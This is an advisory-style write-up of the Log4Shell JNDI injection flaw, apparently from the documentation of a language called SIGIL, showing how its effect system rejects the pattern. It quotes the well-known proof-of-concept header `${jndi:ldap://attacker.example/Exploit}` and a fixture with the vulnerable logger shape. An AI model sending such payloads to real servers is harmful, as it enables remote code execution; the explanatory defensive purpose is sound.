# CVE-2021-44228: Log4Shell (Apache Log4j JNDI injection)

**Affected:** Apache Log4j 2.0-beta9 through 2.14.1
**CVE record:** https://nvd.nist.gov/vuln/detail/CVE-2021-44228
**Severity:** CVSS 10.0 (Critical)
**Scope of claim:** STRUCTURAL

## What was the bug

Apache Log4j 2.x is one of the most-used logging libraries in the Java ecosystem. Versions 2.0-beta9 through 2.14.1 supported a feature called "JNDI lookups" inside log message templates — strings like `${jndi:ldap://attacker.example/payload}` would cause Log4j to fetch and execute remote code at log time.

The bug was that **any string reaching the logger** was implicitly an expression Log4j would interpret. Web servers routinely log User-Agent headers, query parameters, error messages, and other untrusted attacker-controlled inputs. An attacker who could get a payload into ANY logged string — a User-Agent, a 404 path, a chat message — could trigger the server to execute arbitrary remote code via LDAP or RMI.

The bug was disclosed December 9, 2021, and mass exploitation began within hours. The vulnerable code path was reachable on essentially every Java-based web service in the world.

## How attackers exploited it

The canonical proof-of-concept payload:

```
User-Agent: ${jndi:ldap://attacker.example/Exploit}
```

When the server logged this header, Log4j parsed the `${jndi:...}` substring, opened an LDAP connection to the attacker's controlled host, fetched a Java class file, and instantiated it server-side. The resulting object's constructor or static initializer could execute arbitrary code.

Attackers used Log4Shell against minecraft servers, AWS workloads, iCloud, Tesla telematics, and countless other Java services. CVE-2021-44228 was followed by a sequence of incomplete patches (CVE-2021-45046, CVE-2021-45105, CVE-2021-44832) as the vulnerability surface kept expanding.

## SIGIL's defense

The Log4Shell bug existed because a function intuitively "pure" (write a log line) actually had hidden FFI/network authority. The signature `void log(String message)` looked safe; the implementation secretly performed JNDI lookups.

SIGIL's effect system makes hidden authority impossible. A function that performs FFI or `Unsafe` operations must declare those effects in its row:

```
fn log_message(...) -> i64 ! { FFI, Unsafe } { ... }
```

And inner-ring (default) modules **cannot** declare functions carrying `FFI` or `Unsafe` effects. Those effects are reserved for `#[ring(outer)] #[trusted]` modules. A developer who tries to write "a logger that secretly does I/O" is rejected by the privilege type validator before the program even reaches the linker.

The vulnerable fixture demonstrates this: an inner-ring `log_message` function declaring `FFI, Unsafe` fires E003 ("inner-ring function declares privilege effect(s)").

## Vulnerable shape

See [`01_cve_2021_44228_log4shell.sigil`](01_cve_2021_44228_log4shell.sigil).

```sigil
fn log_message(msg_ptr: i64, msg_len: i64) -> i64 ! { FFI, Unsafe } {  // E003 fires here
    return jndi_fetch(msg_ptr, msg_len);
}
```

## Safe alternative

See [`01_cve_2021_44228_log4shell_safe.sigil`](01_cve_2021_44228_log4shell_safe.sigil).

A legitimate logger in SIGIL has no FFI in its effect row at all — it only writes to an allocated buffer. The bug pattern is rejected at the declaration site, before any malicious payload can be crafted.
